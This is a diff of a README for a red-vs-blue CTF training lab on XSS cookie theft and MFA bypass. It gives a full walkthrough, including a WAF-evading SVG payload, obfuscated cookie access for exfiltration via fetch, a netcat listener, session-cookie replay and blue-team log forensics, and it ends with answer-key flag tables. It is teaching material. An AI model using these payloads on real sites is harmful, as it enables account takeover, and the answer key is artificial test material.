@@ -1,5 +1,5 @@
-# 🔴🔵 SecOpsTrack — Red vs Blue CTF Lab
-> **by SalimLabs** | Built by Prima Praditya (CEH) | [linkedin.com/in/primaadit](https://linkedin.com/in/primaadit)
+# 🔴🔵 Red vs Blue CTF Lab — Cookies Reuse & MFA Bypass
+> Built by Prima Praditya | [linkedin.com/in/primaadit](https://linkedin.com/in/primaadit)
 
 **Cookies Reuse & MFA Bypass Scenario**
 
@@ -38,7 +38,7 @@ ctf-lab/
 
 ### One-Command Deploy
 ```bash
-git clone https://github.com/YOUR_USERNAME/ctf-lab.git
+git clone https://github.com/primaadit/ctf-lab.git
 cd ctf-lab
 sudo bash scripts/setup.sh
 ```
@@ -69,20 +69,20 @@ docker-compose up -d --build
 ```bash
 # 1. Identify backend via response header
 curl -I http://feedback.admin.local:3075/
-# X-Powered-By: Node.js -> SCENARIO75{Node.js}
+# X-Powered-By: Node.js -> SALIMLABS{Node.js}
 
 # 2. Read robots.txt (hinted by ASCII art in page source)
 curl http://feedback.admin.local:3075/robots.txt
-# Disallow: /api/verify-mfa -> SCENARIO75{/api/verify-mfa}
-# Disallow: /dashboard       -> SCENARIO75{/dashboard}
-# ASCII art hint in source  -> SCENARIO75{robots.txt}
+# Disallow: /api/verify-mfa -> SALIMLABS{/api/verify-mfa}
+# Disallow: /dashboard       -> SALIMLABS{/dashboard}
+# ASCII art hint in source  -> SALIMLABS{robots.txt}
 
 # 3. Observe initial cookie (HttpOnly=false)
 curl -v http://feedback.admin.local:3075/ 2>&1 | grep Set-Cookie
 # pre_mfa_session=pending_mfa_verification
-# -> SCENARIO75{pre_mfa_session}
-# -> SCENARIO75{pending_mfa_verification}
-# -> SCENARIO75{False}  (no HttpOnly flag)
+# -> SALIMLABS{pre_mfa_session}
+# -> SALIMLABS{pending_mfa_verification}
+# -> SALIMLABS{False}  (no HttpOnly flag)
 ```
 
 ### Phase 2: WAF Bypass + XSS Cookie Theft
@@ -92,10 +92,10 @@ curl -v http://feedback.admin.local:3075/ 2>&1 | grep Set-Cookie
 curl -X POST http://feedback.admin.local:3075/api/feedback \
   -H "Content-Type: application/json" \
   -d '{"name":"x","message":"<script>alert(1)</script>"}'
-# 403 Forbidden -> SCENARIO75{POST}, SCENARIO75{403}
+# 403 Forbidden -> SALIMLABS{POST}, SALIMLABS{403}
 
 # 2. SVG onload bypass (HTML5 element, WAF doesn't check it)
-# SCENARIO75{<svg>}
+# SALIMLABS{<svg>}
 curl -X POST http://feedback.admin.local:3075/api/feedback \
   -H "Content-Type: application/json" \
   -d '{"name":"attacker","message":"<svg onload=alert(1)>"}'
@@ -103,8 +103,8 @@ curl -X POST http://feedback.admin.local:3075/api/feedback \
 
 # 3. Full exfiltration payload (use in browser)
 # Bracket notation bypasses document.cookie block
-# SCENARIO75{window['docu'+'ment']['coo'+'kie']}
-# SCENARIO75{fetch}
+# SALIMLABS{window['docu'+'ment']['coo'+'kie']}
+# SALIMLABS{fetch}
 ```
 
 XSS payload to inject via feedback form in browser:
@@ -123,14 +123,14 @@ nc -lvnp 8080
 
 ```bash
 # Replay adm_sess cookie - MFA endpoint is completely skipped
-# SCENARIO75{adm_sess}
-# SCENARIO75{/api/verify-mfa}  <- never called when cookie replayed
+# SALIMLABS{adm_sess}
+# SALIMLABS{/api/verify-mfa}  <- never called when cookie replayed
 curl -b "adm_sess=adm_sess_4dm1n_s3cr3t_t0k3n_2024" \
   http://feedback.admin.local:3075/dashboard
 
 # Dashboard loads with:
-# - div class="xss-payload"  -> SCENARIO75{xss-payload}
-# - SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}  <- FINAL RED FLAG
+# - div class="xss-payload"  -> SALIMLABS{xss-payload}
+# - SALIMLABS{RED_C00k13_MFA_Byp4ss_0wn3d}  <- FINAL RED FLAG
 ```
 
 ---
@@ -145,20 +145,20 @@ ssh analyst@<VM_IP> -p 2275  # blue_team_rocks
 ### Phase 1: Log Forensics
 
 ```bash
-ls /opt/admin/logs/        # SCENARIO75{/opt/admin/logs}
+ls /opt/admin/logs/        # SALIMLABS{/opt/admin/logs}
 
 # Identify attacker (non-legitimate) IP
 cat /opt/admin/logs/access.log
-# 10.10.14.50 = attacker  -> SCENARIO75{10.10.14.50}
-# Mozilla/5.0 user agent  -> SCENARIO75{Mozilla/5.0}
+# 10.10.14.50 = attacker  -> SALIMLABS{10.10.14.50}
+# Mozilla/5.0 user agent  -> SALIMLABS{Mozilla/5.0}
 
 # Find successful dashboard access
 grep "GET /dashboard" /opt/admin/logs/access.log | grep " 200 "
-# 18:51:55 timestamp      -> SCENARIO75{18:51:55}, SCENARIO75{200}
+# 18:51:55 timestamp      -> SALIMLABS{18:51:55}, SALIMLABS{200}
 
 # Find Base64 exfiltration in X-Forwarded-For field
 grep "QkxVRV" /opt/admin/logs/access.log
-# -> SCENARIO75{QkxVRV9GTEFHe0wwR19IVW50M3JfTTRzdDNyXzB3bjN9}
+# -> SALIMLABS{QkxVRV9GTEFHe0wwR19IVW50M3JfTTRzdDNyXzB3bjN9}
 ```
 
 ### Phase 2: Threat Hunting
@@ -166,19 +166,19 @@ grep "QkxVRV" /opt/admin/logs/access.log
 ```bash
 # Legit traffic baseline
 grep "192.168.1.100" /opt/admin/logs/access.log
-# -> SCENARIO75{192.168.1.100}
+# -> SALIMLABS{192.168.1.100}
 
-# Attacker subnet: 10.10.14.50 -> SCENARIO75{10.10.14.0/24}
+# Attacker subnet: 10.10.14.50 -> SALIMLABS{10.10.14.0/24}
 
 # First WAF block in error.log
 grep "WAF_BLOCK" /opt/admin/logs/error.log | head -1
-# Timestamp: 18:50:15   -> SCENARIO75{18:50:15}
-# Payload: <script>     -> SCENARIO75{<script>}
-# File:                 -> SCENARIO75{/opt/admin/logs/error.log}
+# Timestamp: 18:50:15   -> SALIMLABS{18:50:15}
+# Payload: <script>     -> SALIMLABS{<script>}
+# File:                 -> SALIMLABS{/opt/admin/logs/error.log}
 
 # Verify attacker never hit /api/verify-mfa
 grep "10.10.14.50" /opt/admin/logs/access.log | grep "verify-mfa"
-# No results            -> SCENARIO75{No}
+# No results            -> SALIMLABS{No}
 ```
 
 ### Phase 3: Incident Response
@@ -186,23 +186,23 @@ grep "10.10.14.50" /opt/admin/logs/access.log | grep "verify-mfa"
 ```bash
 # Decode the Base64 exfiltration string
 echo "QkxVRV9GTEFHe0wwR19IVW50M3JfTTRzdDNyXzB3bjN9" | base64 -d
-# Encoding type         -> SCENARIO75{Base64}
+# Encoding type         -> SALIMLABS{Base64}
 
 # Verify 44-char length
 echo -n "QkxVRV9GTEFHe0wwR19IVW50M3JfTTRzdDNyXzB3bjN9" | wc -c
-# 44                    -> SCENARIO75{44}
+# 44                    -> SALIMLABS{44}
 
 # Find CRITICAL cookie reuse events
 grep "CRITICAL" /opt/admin/logs/error.log
-#                       -> SCENARIO75{CRITICAL}
+#                       -> SALIMLABS{CRITICAL}
 
 # Authentication bypass anomaly entry
 grep "18:53:10" /opt/admin/logs/error.log
-# "Authentication bypass anomaly"  -> SCENARIO75{18:53:10}
-#                                  -> SCENARIO75{Authentication bypass anomaly}
+# "Authentication bypass anomaly"  -> SALIMLABS{18:53:10}
+#                                  -> SALIMLABS{Authentication bypass anomaly}
 
 # FINAL BLUE FLAG
-# -> SCENARIO75{BLUE_L0G_HUnt3r_M4st3r}
+# -> SALIMLABS{BLUE_L0G_HUnt3r_M4st3r}
 ```
 
 ---
@@ -212,44 +212,44 @@ grep "18:53:10" /opt/admin/logs/error.log
 ### Red Team (16 flags)
 | Flag | Location |
 |---|---|
-| `SCENARIO75{Node.js}` | X-Powered-By header |
-| `SCENARIO75{/api/verify-mfa}` | robots.txt |
-| `SCENARIO75{/dashboard}` | robots.txt |
-| `SCENARIO75{robots.txt}` | HTML source ASCII art |
-| `SCENARIO75{pre_mfa_session}` | Cookie name |
-| `SCENARIO75{pending_mfa_verification}` | Cookie value |
-| `SCENARIO75{POST}` | Feedback endpoint method |
-| `SCENARIO75{403}` | WAF block status code |
-| `SCENARIO75{<svg>}` | WAF bypass element |
-| `SCENARIO75{window['docu'+'ment']['coo'+'kie']}` | Cookie obfuscation |
-| `SCENARIO75{False}` | HttpOnly=false |
-| `SCENARIO75{fetch}` | Exfiltration API |
-| `SCENARIO75{/api/verify-mfa}` | Skipped during replay |
-| `SCENARIO75{adm_sess}` | Admin session prefix |
-| `SCENARIO75{xss-payload}` | Dashboard CSS class |
-| **`SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}`** | **Final flag in dashboard** |
+| `SALIMLABS{Node.js}` | X-Powered-By header |
+| `SALIMLABS{/api/verify-mfa}` | robots.txt |
+| `SALIMLABS{/dashboard}` | robots.txt |
+| `SALIMLABS{robots.txt}` | HTML source ASCII art |
+| `SALIMLABS{pre_mfa_session}` | Cookie name |
+| `SALIMLABS{pending_mfa_verification}` | Cookie value |
+| `SALIMLABS{POST}` | Feedback endpoint method |
+| `SALIMLABS{403}` | WAF block status code |
+| `SALIMLABS{<svg>}` | WAF bypass element |
+| `SALIMLABS{window['docu'+'ment']['coo'+'kie']}` | Cookie obfuscation |
+| `SALIMLABS{False}` | HttpOnly=false |
+| `SALIMLABS{fetch}` | Exfiltration API |
+| `SALIMLABS{/api/verify-mfa}` | Skipped during replay |
+| `SALIMLABS{adm_sess}` | Admin session prefix |
+| `SALIMLABS{xss-payload}` | Dashboard CSS class |
+| **`SALIMLABS{RED_C00k13_MFA_Byp4ss_0wn3d}`** | **Final flag in dashboard** |
 
 ### Blue Team (17 flags)
 | Flag | Location |
 |---|---|
-| `SCENARIO75{/opt/admin/logs}` | Log directory path |
-| `SCENARIO75{10.10.14.50}` | Attacker IP in access.log |
-| `SCENARIO75{Mozilla/5.0}` | Attacker User-Agent |
-| `SCENARIO75{200}` | Dashboard response status |
-| `SCENARIO75{18:51:55}` | Dashboard access timestamp |
-| `SCENARIO75{QkxVRV9GTEFHe0wwR19IVW50M3JfTTRzdDNyXzB3bjN9}` | X-Forwarded-For field |
-| `SCENARIO75{192.168.1.100}` | Legit baseline traffic IP |
-| `SCENARIO75{10.10.14.0/24}` | Attacker subnet |
-| `SCENARIO75{/opt/admin/logs/error.log}` | Error log path |
-| `SCENARIO75{<script>}` | First blocked WAF payload |
-| `SCENARIO75{18:50:15}` | First WAF block timestamp |
-| `SCENARIO75{No}` | Attacker never hit verify-mfa |
-| `SCENARIO75{Base64}` | Exfiltration encoding type |
-| `SCENARIO75{44}` | Encoded string length |
-| `SCENARIO75{CRITICAL}` | Cookie reuse log level |
-| `SCENARIO75{18:53:10}` | Bypass anomaly timestamp |
-| `SCENARIO75{Authentication bypass anomaly}` | Anomaly string |
-| **`SCENARIO75{BLUE_L0G_HUnt3r_M4st3r}`** | **Decoded from Base64** |
+| `SALIMLABS{/opt/admin/logs}` | Log directory path |
+| `SALIMLABS{10.10.14.50}` | Attacker IP in access.log |
+| `SALIMLABS{Mozilla/5.0}` | Attacker User-Agent |
+| `SALIMLABS{200}` | Dashboard response status |
+| `SALIMLABS{18:51:55}` | Dashboard access timestamp |
+| `SALIMLABS{QkxVRV9GTEFHe0wwR19IVW50M3JfTTRzdDNyXzB3bjN9}` | X-Forwarded-For field |
+| `SALIMLABS{192.168.1.100}` | Legit baseline traffic IP |
+| `SALIMLABS{10.10.14.0/24}` | Attacker subnet |
+| `SALIMLABS{/opt/admin/logs/error.log}` | Error log path |
+| `SALIMLABS{<script>}` | First blocked WAF payload |
+| `SALIMLABS{18:50:15}` | First WAF block timestamp |
+| `SALIMLABS{No}` | Attacker never hit verify-mfa |
+| `SALIMLABS{Base64}` | Exfiltration encoding type |
+| `SALIMLABS{44}` | Encoded string length |
+| `SALIMLABS{CRITICAL}` | Cookie reuse log level |
+| `SALIMLABS{18:53:10}` | Bypass anomaly timestamp |
+| `SALIMLABS{Authentication bypass anomaly}` | Anomaly string |
+| **`SALIMLABS{BLUE_L0G_HUnt3r_M4st3r}`** | **Decoded from Base64** |
 
 ---
 
